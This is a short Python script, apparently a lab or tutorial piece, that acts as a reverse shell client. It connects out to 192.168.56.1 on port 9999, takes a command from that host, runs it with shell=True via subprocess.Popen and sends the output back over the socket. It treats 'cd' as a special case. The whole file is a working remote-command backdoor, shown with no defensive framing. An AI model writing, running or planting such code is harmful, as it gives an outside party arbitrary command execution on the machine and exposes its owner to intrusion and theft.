import socket
import subprocess
import os




s=socket.socket()
host="192.168.56.1"
port=9999

def soccon():
    s.connect((host,port))

def recvcon():
    data=s.recv(1024)

    if len(data) >0:
        if data[:2].decode('utf-8') == 'cd':
            os.chdir(data[3:].decode('utf-8'))
        else:
            cmd=subprocess.Popen(data[:].decode('utf-8'), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE , stderr= subprocess.PIPE)
            res_byte=cmd.stdout.read() + cmd.stderr.read()
            currentdir=str.encode(os.getcwd()+' >')
            s.send(res_byte)

def exe():
    soccon()
    recvcon()


exe()
            